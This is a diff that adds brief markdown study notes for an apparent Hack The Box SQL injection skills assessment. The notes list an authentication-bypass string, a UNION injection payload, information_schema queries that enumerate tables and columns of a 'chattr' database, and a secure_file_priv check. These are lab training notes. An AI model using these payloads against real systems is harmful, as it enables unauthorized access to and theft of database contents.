@@ -1,0 +1,36 @@
+# SQL Injection — HTB Skills Assessment
+
+## Authentication / Registration
+
+' OR '1'='1
+
+## Column Enumeration
+
+SELECT 1,2,3,4
+
+## UNION Injection
+
+cn') UNION SELECT 1,2,3,4 -- -
+
+## Database Enumeration
+
+SELECT database()
+
+## Table Enumeration
+
+SELECT table_name
+FROM information_schema.tables
+WHERE table_schema='chattr'
+
+## Column Enumeration
+
+SELECT column_name
+FROM information_schema.columns
+WHERE table_schema='chattr'
+AND table_name='users'
+
+## Global Variables
+
+SELECT variable_name, variable_value
+FROM information_schema.global_variables
+WHERE variable_name='secure_file_priv'
